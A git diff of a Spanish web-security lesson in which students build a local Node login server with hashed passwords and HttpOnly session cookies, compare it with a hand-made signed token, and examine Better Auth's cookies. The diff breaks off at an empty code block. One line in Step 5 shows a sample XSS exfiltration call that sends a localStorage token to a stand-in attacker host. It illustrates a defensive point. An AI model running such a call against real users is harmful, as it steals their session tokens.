@@ -4,116 +4,541 @@ course: "B3"
 title: "Cookies, sesiones y estado"
 order: 4
 minutes: 60
-summary: "Cómo recuerda el servidor quién eres si HTTP no tiene memoria: cookies, sus atributos de seguridad y sesiones frente a tokens."
+summary: "Construyes un login con sesiones y cookies HttpOnly, compruebas en un navegador qué puede leer JavaScript, lo comparas con un token firmado tipo JWT y descifras las cookies de Better Auth."
 ---
 
-Cada petición HTTP llega al servidor **sin memoria** de las anteriores. Y sin embargo, después de iniciar sesión, el servidor sabe quién eres en cada clic. El truco son las **cookies**. En esta sección vas a ver exactamente qué cookie usa Better Auth en tus proyectos, qué significa cada uno de sus atributos y por qué están ahí.
+HTTP **no tiene memoria**: cada petición llega al servidor como si fuera la primera, sin ningún recuerdo de las anteriores. Y aun así, cuando inicias sesión en esta plataforma, cada página sabe quién eres. ¿Cómo? Con **cookies**. En esta sección vas a construir un sistema de login completo con sesiones (contraseñas con _hash_, una cookie `HttpOnly` y un _logout_ que funciona de verdad), vas a comprobar en un navegador real qué puede y qué no puede leer JavaScript, vas a programar la alternativa (un token firmado, la idea de los JWT) para ver sus riesgos, y al final descifrarás las cookies que Better Auth pone en esta misma plataforma.
 
-## HTTP no tiene estado
+**Lo que tendrás al terminar:** `sesiones.js`, un servidor en `http://localhost:3002` con login, sesión y _logout_, y `token.js`, que firma y verifica tokens. Sabrás exactamente cómo tu servidor sabe quién eres en cada petición.
 
-Para el servidor, la petición número 50 de tu sesión es tan desconocida como la primera. HTTP es _stateless_: cada petición debe llevar consigo todo lo necesario para atenderla.
+**Requisitos:** el proyecto `web-lab` de las secciones anteriores.
 
-¿Cómo sabe entonces que eres tú? Porque el navegador **adjunta automáticamente** un dato que el servidor le dio al iniciar sesión.
+## Paso 1: entender por qué hace falta "recordar"
 
-## Cookies
+En B3.1 viste que cada petición es un mensaje independiente: método, ruta, cabeceras y, a veces, cuerpo. Si el servidor no guarda nada y la petición no trae nada que te identifique, el servidor **no puede** saber que eres la misma persona que inició sesión hace un minuto.
 
-Una cookie es un pequeño valor que el **servidor pide guardar** al navegador con la cabecera `Set-Cookie`:
+La solución tiene dos piezas:
 
-```http
-HTTP/1.1 200 OK
-Set-Cookie: better-auth.session_token=abc123…; Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000
-```
+1. Al iniciar sesión, el servidor responde con una cabecera **`Set-Cookie`**: "guarda este dato".
+2. A partir de ahí, el navegador **adjunta automáticamente** ese dato en la cabecera **`Cookie`** de cada petición al mismo sitio.
 
-A partir de ahí, el navegador la **envía en cada petición** a ese dominio:
+La analogía es la pulsera de un festival: en la entrada (el login) comprueban tu entrada y te ponen una pulsera (la cookie). Después, en cada zona (cada petición), solo miran la pulsera, sin volver a pedirte la entrada. Lo importante es **qué lleva escrito** la pulsera, y eso es lo que distingue las dos estrategias que vas a programar.
 
-```http
-GET /temario HTTP/1.1
-Cookie: better-auth.session_token=abc123…
-```
+## Paso 2: construir el login con sesiones en servidor
 
-En Dani Academy, el _middleware_ lee esa cookie en cada petición y llama a Better Auth para saber qué usuario es (`Astro.locals.user`).
-
-## Los atributos, uno a uno
-
-| Atributo              | Qué hace                                                    | Por qué importa                                              |
-| --------------------- | ----------------------------------------------------------- | ------------------------------------------------------------ |
-| `HttpOnly`            | JavaScript **no** puede leerla (`document.cookie` no la ve) | Si alguien inyecta un script (XSS), no puede robar tu sesión |
-| `Secure`              | Solo se envía por HTTPS                                     | Nadie la lee en una red Wi-Fi pública                        |
-| `SameSite=Lax`        | No se envía en peticiones `POST` desde **otros** sitios     | Protege contra CSRF (que otra web actúe en tu nombre)        |
-| `Max-Age` / `Expires` | Cuándo caduca                                               | Sin ellos, desaparece al cerrar el navegador                 |
-| `Path`                | Para qué rutas se envía                                     | `/` = todo el sitio                                          |
-| `Domain`              | Para qué (sub)dominios                                      | Sin él, solo el dominio exacto que la creó                   |
-
-`SameSite` tiene tres valores: `Strict` (nunca desde otros sitios, ni siquiera al seguir un enlace), `Lax` (sí al navegar con enlaces, no en `POST` ni `fetch` desde otros sitios) y `None` (siempre, y exige `Secure`). `Lax` es el equilibrio habitual.
-
-<Callout type="note">
-  En local, la cookie de esta app no lleva `Secure` porque `localhost` usa HTTP. En producción, con
-  HTTPS, Better Auth la marca como `Secure` y añade el prefijo `__Secure-` a su nombre
-  (`__Secure-better-auth.session_token`): el navegador rechaza cualquier cookie con ese prefijo que
-  no venga por HTTPS.
-</Callout>
-
-## Sesión en servidor vs token
-
-Hay dos grandes formas de usar ese dato:
-
-**Sesión en servidor** (lo que hace Better Auth): la cookie contiene un identificador aleatorio; los datos de la sesión están en la base de datos (colección `session` en MongoDB).
-
-- ✅ Cerrar sesión es inmediato: se borra el documento y la cookie deja de valer.
-- ✅ Puedes ver y revocar las sesiones activas.
-- ❌ Hay que consultar la base de datos (Better Auth lo suaviza con una caché firmada de unos minutos: `cookieCache`).
-
-**Token autocontenido (JWT)**: el propio valor contiene los datos del usuario, firmados para que no se puedan alterar.
-
-- ✅ El servidor no consulta la base de datos para validarlo.
-- ❌ No se puede revocar antes de que caduque (salvo con listas negras, que reintroducen la consulta).
-- ❌ Suele guardarse en `localStorage`, donde un script inyectado sí puede leerlo.
-
-Para una app web como esta, la sesión en servidor con cookie `HttpOnly` es la opción más sencilla y segura.
-
-## `localStorage` vs cookies
-
-|                           | Cookie                   | `localStorage`           |
-| ------------------------- | ------------------------ | ------------------------ |
-| ¿Se envía al servidor?    | Sí, automáticamente      | No                       |
-| ¿JavaScript puede leerla? | Solo si no es `HttpOnly` | Siempre                  |
-| Tamaño                    | ~4 KB                    | ~5 MB                    |
-| Uso típico                | Sesión, autenticación    | Preferencias de interfaz |
-
-Esta plataforma guarda en `localStorage` solo el tema claro/oscuro (`da-theme`): si alguien lo leyera, no ganaría nada. La sesión va en una cookie `HttpOnly`.
-
-## Verlas en DevTools
-
-DevTools → **Application** → **Cookies** muestra cada cookie con sus atributos. La columna _HttpOnly_ marcada significa que ni tú desde la consola puedes leerla:
+En la estrategia de **sesiones en servidor**, la cookie solo lleva un **identificador aleatorio** (un número de guardarropa). Los datos (quién eres, cuándo caduca) se quedan en el servidor. Crea `sesiones.js` en `web-lab`:
 
 ```js
-document.cookie; // "" → la cookie de sesión no aparece: es HttpOnly
+// Archivo: sesiones.js
+// Login con sesiones en servidor y cookies, en http://localhost:3002
+import { createServer } from "node:http";
+import { randomBytes, scryptSync, timingSafeEqual } from "node:crypto";
+
+const PUERTO = 3002;
+const DURACION_SESION_S = 60 * 60; // 1 hora
+const EN_PRODUCCION = process.env.NODE_ENV === "production";
+
+// ─── "Base de datos" de usuarios: la contraseña se guarda como hash, nunca en claro ───
+function hashear(contrasena, sal = randomBytes(16).toString("hex")) {
+  return `${sal}:${scryptSync(contrasena, sal, 64).toString("hex")}`;
+}
+
+function contrasenaCorrecta(contrasena, guardado) {
+  const [sal, hash] = guardado.split(":");
+  const calculado = scryptSync(contrasena, sal, 64);
+  return timingSafeEqual(calculado, Buffer.from(hash, "hex"));
+}
+
+const usuarios = new Map([
+  ["dani@example.com", { id: "u_1", nombre: "Dani", hash: hashear("contrasena-segura-123") }],
+]);
+
+// ─── Sesiones en servidor: id aleatorio → datos de la sesión ───
+const sesiones = new Map();
+
+function crearSesion(usuarioId) {
+  const id = randomBytes(32).toString("base64url");
+  sesiones.set(id, { usuarioId, caduca: Date.now() + DURACION_SESION_S * 1000 });
+  return id;
+}
+
+function leerCookies(peticion) {
+  const cookies = {};
+  for (const par of (peticion.headers.cookie ?? "").split(";")) {
+    const [nombre, ...resto] = par.trim().split("=");
+    if (nombre) cookies[nombre] = decodeURIComponent(resto.join("="));
+  }
+  return cookies;
+}
+
+function usuarioDeLaPeticion(peticion) {
+  const id = leerCookies(peticion).sid;
+  const sesion = id && sesiones.get(id);
+  if (!sesion) return null;
+  if (sesion.caduca < Date.now()) {
+    sesiones.delete(id);
+    return null;
+  }
+  return [...usuarios.values()].find((u) => u.id === sesion.usuarioId) ?? null;
+}
+
+function cookieDeSesion(valor, maxAge) {
+  const atributos = [`sid=${valor}`, "Path=/", "HttpOnly", "SameSite=Lax", `Max-Age=${maxAge}`];
+  if (EN_PRODUCCION) atributos.push("Secure");
+  return atributos.join("; ");
+}
+
+// ─── Utilidades ───
+async function leerFormulario(peticion) {
+  let texto = "";
+  for await (const trozo of peticion) texto += trozo;
+  return new URLSearchParams(texto);
+}
+
+function html(respuesta, cuerpo, estado = 200, cabeceras = {}) {
+  respuesta.writeHead(estado, { "Content-Type": "text/html; charset=utf-8", ...cabeceras });
+  respuesta.end(`<!doctype html><html lang="es"><head><meta charset="utf-8"><title>Sesiones</title></head><body>${cuerpo}</body></html>`);
+}
+
+const escapar = (texto) =>
+  texto.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
+
+// ─── Rutas ───
+const servidor = createServer(async (peticion, respuesta) => {
+  const url = new URL(peticion.url ?? "/", `http://${peticion.headers.host}`);
+  const usuario = usuarioDeLaPeticion(peticion);
+  console.log(`${peticion.method} ${url.pathname} · ${usuario ? usuario.nombre : "sin sesión"}`);
+
+  if (url.pathname === "/" && peticion.method === "GET") {
+    if (!usuario) {
+      return html(
+        respuesta,
+        `<h1>Hola, invitado</h1>
+<form method="post" action="/login">
+  <input name="email" type="email" placeholder="Correo" required>
+  <input name="contrasena" type="password" placeholder="Contraseña" required>
+  <button>Entrar</button>
+</form>`,
+      );
+    }
+    return html(
+      respuesta,
+      `<h1>Hola, ${escapar(usuario.nombre)}</h1>
+<p>Tu servidor sabe quién eres por la cookie <code>sid</code>.</p>
+<form method="post" action="/logout"><button>Salir</button></form>`,
+    );
+  }
+
+  if (url.pathname === "/login" && peticion.method === "POST") {
+    const datos = await leerFormulario(peticion);
+    const email = (datos.get("email") ?? "").trim().toLowerCase();
+    const candidato = usuarios.get(email);
+    // Mismo mensaje si el correo no existe o la contraseña falla: no revela qué cuentas existen
+    if (!candidato || !contrasenaCorrecta(datos.get("contrasena") ?? "", candidato.hash)) {
+      return html(respuesta, `<p>Correo o contraseña incorrectos. <a href="/">Volver</a></p>`, 401);
+    }
+    const id = crearSesion(candidato.id);
+    respuesta.writeHead(302, { Location: "/", "Set-Cookie": cookieDeSesion(id, DURACION_SESION_S) });
+    return respuesta.end();
+  }
+
+  if (url.pathname === "/logout" && peticion.method === "POST") {
+    const id = leerCookies(peticion).sid;
+    if (id) sesiones.delete(id); // la sesión deja de existir en el servidor
+    respuesta.writeHead(302, { Location: "/", "Set-Cookie": cookieDeSesion("", 0) });
+    return respuesta.end();
+  }
+
+  if (url.pathname === "/api/yo" && peticion.method === "GET") {
+    respuesta.writeHead(usuario ? 200 : 401, { "Content-Type": "application/json; charset=utf-8" });
+    return respuesta.end(JSON.stringify(usuario ? { id: usuario.id, nombre: usuario.nombre } : { error: "No has iniciado sesión" }));
+  }
+
+  html(respuesta, "<h1>404</h1>", 404);
+});
+
+servidor.listen(PUERTO, "127.0.0.1", () => {
+  console.log(`Servidor de sesiones en http://localhost:${PUERTO}`);
+});
 ```
 
-## Errores comunes
+Las piezas, una a una:
 
-- **Guardar tokens de sesión en `localStorage`.** Cualquier XSS los roba.
-- **Cookies de sesión sin `HttpOnly` o sin `Secure`** en producción.
-- **`SameSite=None` "para que funcione"** sin entender que abre la puerta al CSRF.
-- **Creer que borrar la cookie en el navegador cierra la sesión en el servidor.** Con sesiones en servidor, el documento sigue existiendo hasta que caduca o se borra.
+1. **Contraseñas con _hash_:** `hashear` nunca guarda la contraseña, sino el resultado de `scrypt`, una función diseñada para ser **lenta** a propósito (para que probar millones de contraseñas cueste años). La **sal** (16 bytes aleatorios por usuario) hace que dos usuarios con la misma contraseña tengan _hashes_ distintos. Para comprobar un login se repite el cálculo con la misma sal y se comparan los resultados.
+2. **`timingSafeEqual`** compara en tiempo constante. Una comparación normal (`===`) se detiene en el primer carácter distinto, y midiendo cuánto tarda un atacante podría ir adivinando el _hash_ carácter a carácter.
+3. **`crearSesion`** genera 32 bytes aleatorios con `randomBytes` (imposibles de adivinar) y los guarda en un `Map` junto al usuario y la fecha de caducidad.
+4. **`cookieDeSesion`** construye la cabecera `Set-Cookie` con sus atributos (Paso 4).
+5. **El mismo mensaje** para "ese correo no existe" y "contraseña incorrecta": así nadie puede usar el formulario para averiguar qué correos tienen cuenta.
+6. **`escapar`** convierte `<`, `>` y compañía en entidades HTML antes de insertar el nombre en la página, para que un nombre como `<script>…</script>` no se ejecute (el XSS de B3.1).
+
+Arráncalo en su propia terminal:
+
+```bash
+node sesiones.js
+```
+
+```text
+Servidor de sesiones en http://localhost:3002
+```
+
+<Callout type="risk">
+
+- **Nunca guardes contraseñas en claro ni con un _hash_ rápido** (MD5, SHA-256 a secas): con una filtración de la base de datos, se descifran en minutos. Usa `scrypt`, `bcrypt` o `argon2`. Better Auth usa `scrypt`, como aquí.
+- **Las sesiones en un `Map` se pierden al reiniciar** y no se comparten entre varias instancias del servidor (en Vercel, cada función puede ser una instancia distinta). En producción, las sesiones se guardan en una base de datos: Better Auth las guarda en la colección `session` de MongoDB (Paso 7).
+- **`scryptSync` bloquea el proceso** durante el cálculo (decenas de milisegundos). En un servidor real se usa la versión asíncrona (`scrypt` con _callback_ o promesa) para no detener las demás peticiones mientras tanto.
+
+</Callout>
+
+## Paso 3: seguir la sesión con `curl`
+
+`curl` no guarda cookies por defecto; con `-c archivo` las guarda y con `-b archivo` las envía, como haría un navegador. Primero, sin sesión:
+
+```bash
+curl -i http://localhost:3002/api/yo
+```
+
+```text
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json; charset=utf-8
+
+{"error":"No has iniciado sesión"}
+```
+
+**401: "no sé quién eres"**. Intenta entrar con una contraseña mala y con un correo que no existe:
+
+```bash
+curl -i -X POST http://localhost:3002/login -d "email=dani@example.com&contrasena=mala"
+curl -i -X POST http://localhost:3002/login -d "email=nadie@example.com&contrasena=mala"
+```
+
+Las dos respuestas son **idénticas**: `401` y `Correo o contraseña incorrectos`. Ahora el login correcto, guardando las cookies (las mayúsculas del correo dan igual, porque el servidor lo normaliza):
+
+```bash
+curl -i -c tarro.txt -X POST http://localhost:3002/login -d "email=Dani@Example.com&contrasena=contrasena-segura-123"
+```
+
+```text
+HTTP/1.1 302 Found
+Location: /
+Set-Cookie: sid=paONAdtNlp9NmgUjsNaDoiMVhuqqvmj1xyRSqLBGhsk; Path=/; HttpOnly; SameSite=Lax; Max-Age=3600
+```
+
+Un **`302`** (redirección temporal) a `/` y la cookie. Mira cómo la guardó `curl`:
+
+```bash
+cat tarro.txt
+```
+
+```text
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+#HttpOnly_localhost	FALSE	/	FALSE	1791542094	sid	yHDI5X6AmobGm7foFfMOeeKJjChv3mi1rjoS8ftjYBk
+```
+
+(El valor es distinto en cada login). Ahora, con la cookie, el servidor sabe quién eres:
+
+```bash
+curl -i -b tarro.txt http://localhost:3002/api/yo
+```
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"id":"u_1","nombre":"Dani"}
+```
+
+Y en la terminal del servidor:
+
+```text
+GET /api/yo · sin sesión
+POST /login · sin sesión
+POST /login · sin sesión
+POST /login · sin sesión
+GET /api/yo · Dani
+```
+
+Ahora el experimento importante: **¿qué pasa si alguien te roba la cookie?** Copia el valor de `sid` de tu `tarro.txt` y úsalo "desde otro ordenador" con una cabecera `Cookie` escrita a mano:
+
+```bash
+curl http://localhost:3002/api/yo -H "Cookie: sid=PEGA_AQUI_EL_VALOR"
+```
+
+```text
+{"id":"u_1","nombre":"Dani"}
+```
+
+Funciona: **quien tiene la cookie es tú** para el servidor. Ahora cierra sesión y repite con la cookie robada:
+
+```bash
+curl -b tarro.txt -c tarro.txt -X POST http://localhost:3002/logout
+curl http://localhost:3002/api/yo -H "Cookie: sid=PEGA_AQUI_EL_VALOR"
+```
+
+```text
+{"error":"No has iniciado sesión"}
+```
+
+**La cookie robada ya no sirve**, porque el _logout_ borró la sesión **en el servidor** (`sesiones.delete(id)`). Esta es la gran ventaja de las sesiones en servidor: puedes revocarlas cuando quieras.
+
+<Callout type="risk">
+
+- **El _logout_ tiene que borrar la sesión en el servidor**, no solo la cookie. Si solo enviaras `Max-Age=0`, tu navegador olvidaría la cookie, pero cualquier copia robada seguiría funcionando hasta que caducara.
+- **`tarro.txt` contiene una sesión válida:** es como un archivo de contraseñas. No lo subas a Git ni lo compartas; bórralo cuando termines (`rm tarro.txt`).
+- **Sin límite de intentos, el login se puede atacar por fuerza bruta:** nada impide probar millones de contraseñas. Las apps reales limitan los intentos por IP y por cuenta (responden `429 Too Many Requests`). Esta plataforma lo hace con una colección `rate_limits` en MongoDB.
+
+</Callout>
+
+## Paso 4: los atributos de una cookie
+
+La cabecera `Set-Cookie: sid=…; Path=/; HttpOnly; SameSite=Lax; Max-Age=3600` tiene el valor y una serie de **atributos** que deciden cuándo se envía y quién puede leerla:
+
+| Atributo       | Qué hace                                                                                                                     | Por qué en una cookie de sesión                                            |
+| -------------- | ---------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
+| `HttpOnly`     | JavaScript **no** puede leerla (`document.cookie` no la ve)                                                                  | Un script inyectado (XSS) no puede robar la sesión                         |
+| `Secure`       | Solo se envía por HTTPS                                                                                                      | Nadie la lee en una red wifi pública sin cifrar                            |
+| `SameSite=Lax` | No se envía en peticiones que otras webs lanzan "por detrás" (formularios `POST`, `fetch`, imágenes); sí al seguir un enlace | Protege contra CSRF: otra web no puede hacer peticiones en tu nombre       |
+| `Max-Age=3600` | Caduca en 3600 segundos (`0` la borra)                                                                                       | Sin él, es una cookie "de sesión del navegador" que desaparece al cerrarlo |
+| `Path=/`       | Se envía en todas las rutas del sitio                                                                                        | La sesión vale para toda la app                                            |
+| `Domain`       | Si se indica, se envía también a los subdominios                                                                             | Sin él (lo recomendable), solo al dominio exacto que la creó               |
+
+Sobre `Secure`: el servidor solo lo añade si `NODE_ENV=production`. Ejecútalo así y compruébalo:
+
+```bash
+NODE_ENV=production node sesiones.js
+```
+
+En la cabecera `Set-Cookie` del login aparecerá también `Secure`. En `localhost` los navegadores permiten las cookies `Secure` aunque no haya HTTPS, pero `curl` y otros clientes no siempre lo hacen; por eso solo se activa en producción.
+
+<Callout type="risk">
+
+- **`SameSite=None` exige `Secure`** y vuelve a permitir el envío desde otras webs. Solo lo necesitas si tu cookie debe viajar en peticiones entre sitios distintos (por ejemplo, un _widget_ incrustado en otra web). Para una app normal, `Lax`.
+- **`Domain=tudominio.com` comparte la cookie con todos los subdominios**: si un subdominio es inseguro (un blog antiguo en `blog.tudominio.com`), puede leer o sobrescribir la sesión de tu app. No pongas `Domain` salvo que lo necesites.
+- **Las cookies ocupan espacio en cada petición:** el navegador las envía todas, en todas las peticiones al dominio, incluidas las de imágenes y CSS. No guardes datos grandes en cookies (el límite es unos 4 KB por cookie).
+
+</Callout>
+
+## Paso 5: qué ve JavaScript en el navegador
+
+Con `sesiones.js` en marcha, abre `http://localhost:3002/` en el navegador e inicia sesión con `dani@example.com` y `contrasena-segura-123`. Verás `Hola, Dani`. Ahora abre DevTools (`Cmd` + `Option` + `I`) → pestaña _Console_ y ejecuta, línea a línea:
+
+```js
+document.cookie = "tema=dark; Path=/; Max-Age=31536000";
+localStorage.setItem("token", "eyJ-token-de-ejemplo");
+document.cookie;
+localStorage.getItem("token");
+const respuesta = await fetch("/api/yo");
+respuesta.status;
+```
+
+Resultados:
+
+```text
+'tema=dark'
+'eyJ-token-de-ejemplo'
+200
+```
+
+Y en la pestaña _Application_ → _Cookies_ → `http://localhost:3002` verás las dos cookies: `tema` (sin la marca de _HttpOnly_) y `sid` (con _HttpOnly_ marcado y _SameSite_ `Lax`).
+
+La conclusión, que es la clave de toda la sección:
+
+- **`document.cookie` solo muestra `tema=dark`**: la cookie `sid` existe y se envía (el `fetch` devuelve `200`, así que el servidor te reconoce), pero **JavaScript no puede leerla**. Es `HttpOnly`.
+- **`localStorage` lo lee cualquier script de la página.** Si guardaras ahí tu token de sesión, cualquier script inyectado (por un XSS, o por una librería de terceros comprometida) podría leerlo y enviarlo a otro servidor con una línea: `fetch("https://atacante.com?t=" + localStorage.getItem("token"))`.
+
+|                           | Cookie `HttpOnly`                                                                                       | `localStorage`                                  |
+| ------------------------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
+| La lee JavaScript         | No                                                                                                      | Sí                                              |
+| Se envía sola al servidor | Sí, en cada petición                                                                                    | No, hay que añadirla a mano                     |
+| Ante un XSS               | No se puede robar (aunque el script sí puede hacer peticiones en tu nombre mientras estás en la página) | Se puede robar y usar desde cualquier sitio     |
+| Sirve para                | Sesiones                                                                                                | Preferencias que no son secretas (tema, idioma) |
+
+<Callout type="risk">
+
+- **`HttpOnly` reduce el daño de un XSS, no lo elimina:** un script inyectado no puede llevarse la cookie, pero mientras la página esté abierta puede hacer `fetch` a tu API, y la cookie viajará sola. La defensa principal contra el XSS es no insertar nunca texto sin escapar (Astro lo hace por ti con `{}`).
+- **El botón de tema de esta plataforma usa `localStorage`** (para recordar claro u oscuro) y la sesión usa una cookie `HttpOnly`. Es exactamente la división correcta: lo que no es secreto, en `localStorage`; lo que identifica al usuario, en una cookie que JavaScript no ve.
+
+</Callout>
+
+## Paso 6: la alternativa, un token firmado (JWT)
+
+En la otra gran estrategia, la cookie (o la cabecera `Authorization`) lleva **los datos del usuario dentro**, firmados con un secreto que solo conoce el servidor. Es la idea de los **JWT** (_JSON Web Tokens_). El servidor no guarda nada: para saber quién eres, solo comprueba la firma. Crea `token.js`:
+
+```js
+// Archivo: token.js
+// Un token firmado "a mano" (la idea de un JWT): los datos viajan en el token, firmados con un secreto
+import { createHmac, timingSafeEqual } from "node:crypto";
+
+const SECRETO = "un-secreto-largo-que-solo-conoce-el-servidor-1234567890";
+
+const base64url = (texto) => Buffer.from(texto).toString("base64url");
+
+function firmar(datos) {
+  const carga = base64url(JSON.stringify(datos));
+  const firma = createHmac("sha256", SECRETO).update(carga).digest("base64url");
+  return `${carga}.${firma}`;
+}
+
+function verificar(token) {
+  const [carga, firma] = token.split(".");
+  if (!carga || !firma) return { valido: false, motivo: "formato incorrecto" };
+  const esperada = createHmac("sha256", SECRETO).update(carga).digest("base64url");
+  const a = Buffer.from(firma);
+  const b = Buffer.from(esperada);
+  if (a.length !== b.length || !timingSafeEqual(a, b)) return { valido: false, motivo: "firma no válida" };
+  const datos = JSON.parse(Buffer.from(carga, "base64url").toString());
+  if (datos.exp < Date.now() / 1000) return { valido: false, motivo: "caducado" };
+  return { valido: true, datos };
+}
+
+const ahora = Math.floor(Date.now() / 1000);
+const token = firmar({ sub: "u_1", nombre: "Dani", rol: "alumno", exp: ahora + 3600 });
+console.log("Token:", token);
+console.log("Verificación:", verificar(token));
+
+// 1. Los datos NO están cifrados: cualquiera puede leerlos
+const [carga] = token.split(".");
+console.log("Lo que lee cualquiera:", Buffer.from(carga, "base64url").toString());
+
+// 2. Pero no se pueden cambiar sin el secreto: la firma deja de coincidir
+const cargaFalsa = base64url(JSON.stringify({ sub: "u_1", nombre: "Dani", rol: "admin", exp: ahora + 3600 }));
+const tokenFalso = `${cargaFalsa}.${token.split(".")[1]}`;
+console.log("Token manipulado:", verificar(tokenFalso));
+
+// 3. Caduca solo: el servidor no guarda nada, así que no puede "cerrar" un token antes de tiempo
+const caducado = firmar({ sub: "u_1", nombre: "Dani", rol: "alumno", exp: ahora - 1 });
+console.log("Token caducado:", verificar(caducado));
+```
+
+```bash
+node token.js
+```
+
+```text
+Token: eyJzdWIiOiJ1XzEiLCJub21icmUiOiJEYW5pIiwicm9sIjoiYWx1bW5vIiwiZXhwIjoxNzkxNTQyMTA5fQ.3YzyFe-l1zTescgcgD62HVOxU6pZrNuj27xIq74e1tI
+Verificación: {
+  valido: true,
+  datos: { sub: 'u_1', nombre: 'Dani', rol: 'alumno', exp: 1791542109 }
+}
+Lo que lee cualquiera: {"sub":"u_1","nombre":"Dani","rol":"alumno","exp":1791542109}
+Token manipulado: { valido: false, motivo: 'firma no válida' }
+Token caducado: { valido: false, motivo: 'caducado' }
+```
+
+Los tres experimentos del final explican las propiedades de un token firmado:
+
+1. **Los datos no están cifrados**, solo codificados en _base64url_: cualquiera que tenga el token puede leer lo que lleva. Nunca metas en un token información que el usuario no deba ver.
+2. **No se pueden cambiar sin el secreto:** el token manipulado (con `rol: "admin"`) se rechaza porque la firma ya no coincide. La firma es un HMAC: un resumen de los datos calculado con el secreto.
+3. **Caduca solo, y no se puede revocar antes:** como el servidor no guarda nada, no tiene dónde "borrar" un token. Si te lo roban, funciona hasta que caduque.
+
+|                                    | Sesión en servidor                           | Token firmado (JWT)                                                 |
+| ---------------------------------- | -------------------------------------------- | ------------------------------------------------------------------- |
+| Qué lleva la cookie                | Un identificador aleatorio                   | Los datos del usuario, firmados                                     |
+| Qué guarda el servidor             | La sesión (en memoria o en la base de datos) | Nada (solo el secreto)                                              |
+| Coste por petición                 | Una consulta para buscar la sesión           | Calcular una firma                                                  |
+| _Logout_ real o expulsar a alguien | Inmediato (borrar la sesión)                 | Difícil: hay que esperar a que caduque o mantener una "lista negra" |
+| Si cambia el rol del usuario       | Se nota en la siguiente petición             | El token viejo sigue diciendo el rol antiguo hasta que caduca       |
+
+Para una app web con su propio servidor (como las tuyas en Astro), las **sesiones en servidor** son la opción más segura y sencilla. Los tokens brillan cuando varios servicios distintos necesitan verificar al usuario sin compartir una base de datos.
+
+<Callout type="risk">
+
+- **El secreto lo es todo:** con él, cualquiera puede fabricar tokens válidos con el rol que quiera. Va en una variable de entorno, nunca en el código ni en Git (aquí está en el código solo para el ejemplo). Es el papel de `BETTER_AUTH_SECRET` en esta plataforma.
+- **No escribas tu propia librería de JWT en producción:** este archivo es para entender la idea. Las librerías reales (como `jose`) manejan cabeceras, algoritmos y casos límite que han causado vulnerabilidades famosas (por ejemplo, aceptar tokens con el algoritmo `none`).
+- **Tokens largos en `localStorage`** juntan los dos peores riesgos: legibles por cualquier script y válidos durante días. Si usas tokens en una web, que sean de corta duración y viajen en una cookie `HttpOnly`.
+
+</Callout>
+
+## Paso 7: qué hace Better Auth con tus cookies
+
+Ahora que sabes construirlo a mano, mira lo que hace Better Auth en esta plataforma. Así responde el servidor al crear una cuenta (los valores se han sustituido por marcadores):
+
+```text
+HTTP/1.1 200 OK
+set-cookie: better-auth.session_token=<token>.<firma>; Max-Age=2592000; Path=/; HttpOnly; SameSite=Lax
+set-cookie: better-auth.session_data=<datos-de-sesión>; Max-Age=300; Path=/; HttpOnly; SameSite=Lax
+```
+
+Con lo aprendido, puedes leerlo entero:
+
+- **`better-auth.session_token`** es una **sesión en servidor**, como tu `sid`: un token aleatorio que identifica un documento de la colección `session` de MongoDB. Ese documento tiene los campos `_id`, `token`, `userId`, `expiresAt`, `createdAt`, `updatedAt`, `ipAddress` y `userAgent`. Además, el valor de la cookie lleva **`.<firma>`**: Better Auth firma el token con `BETTER_AUTH_SECRET`, así que una cookie inventada se rechaza sin consultar la base de datos.
+- **`Max-Age=2592000`** son 30 días: la sesión dura un mes, y se renueva sola si entras al menos una vez al día.
+- **`better-auth.session_data`** es una **caché firmada** de los datos de la sesión, válida 5 minutos (`Max-Age=300`): durante ese tiempo, el servidor puede saber quién eres **sin consultar MongoDB** en cada petición. Combina lo mejor de las dos estrategias: la rapidez del token firmado y la revocación de la sesión en servidor, con un retraso máximo de 5 minutos.
+- **`HttpOnly` y `SameSite=Lax`** en las dos, por lo que has visto en los Pasos 4 y 5.
+- **Falta `Secure`** porque esto es `http://localhost`. En producción (HTTPS), Better Auth añade `Secure` y cambia el nombre de las cookies a **`__Secure-better-auth.session_token`**. El prefijo `__Secure-` obliga al navegador a aceptar la cookie solo si llega por HTTPS con `Secure`.
+
+En cada petición, el _middleware_ de la plataforma (`src/middleware.ts`) lee esa cookie, obtiene la sesión y deja el usuario en `Astro.locals.user`. Si no hay sesión, las páginas redirigen a `/login` y las APIs responden `401`. Es exactamente el flujo de tu `usuarioDeLaPeticion`.
+
+<Callout type="risk">
+
+- **Si buscas la cookie en producción con su nombre de `localhost`, no la encontrarás:** en HTTPS se llama `__Secure-better-auth.session_token`. Es un error habitual al escribir pruebas o código que lee la cookie directamente.
+- **Cambiar `BETTER_AUTH_SECRET` cierra todas las sesiones:** las firmas de las cookies existentes dejan de ser válidas. Es lo que quieres si el secreto se filtró; si lo cambias por accidente, todos los usuarios tendrán que volver a entrar.
+
+</Callout>
+
+## Ejercicio práctico
 
 <Callout type="exercise">
-  1. Inicia sesión en tu app de entrenamiento y, en DevTools → Application → Cookies, documenta cada
-  cookie y sus atributos. 2. Ejecuta `document.cookie` en la consola y explica por qué no aparece la
-  cookie de sesión. 3. Abre MongoDB Compass y localiza tu documento en la colección `session`.
-  Cierra sesión y comprueba que desaparece. 4. Explica con tus palabras qué ataque impediría cada
-  atributo si faltara: `HttpOnly`, `Secure` y `SameSite`.
+
+1. Inicia sesión en tu app de entrenamiento (o en esta plataforma) y, en DevTools → _Application_ → _Cookies_, documenta cada cookie: nombre, valor (solo los primeros caracteres), `HttpOnly`, `Secure`, `SameSite`, caducidad y para qué sirve.
+2. En la consola, ejecuta `document.cookie` y explica por qué no aparece la cookie de sesión.
+3. Añade a `sesiones.js` una página `/perfil` que muestre el nombre del usuario y la hora a la que caduca su sesión, y que redirija a `/` con un `302` si no hay sesión.
+
+</Callout>
+
+Solución del punto 3. Añade este bloque en las rutas de `sesiones.js`, justo antes de la ruta `/api/yo`:
+
+```js
